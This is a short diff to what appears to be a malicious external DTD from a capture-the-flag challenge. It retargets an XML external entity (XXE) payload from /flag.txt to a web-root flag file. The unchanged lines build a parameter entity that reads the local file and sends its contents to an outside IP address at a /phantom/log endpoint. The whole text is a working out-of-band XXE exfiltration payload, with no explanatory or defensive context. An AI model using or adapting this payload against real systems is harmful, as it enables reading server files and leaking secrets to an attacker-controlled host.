@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///flag.txt">
+<!ENTITY % file SYSTEM "file:///var/www/html/phantom/flag.txt">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://18.220.254.32/phantom/log?%file;'>">
 %eval;
 %exfiltrate;
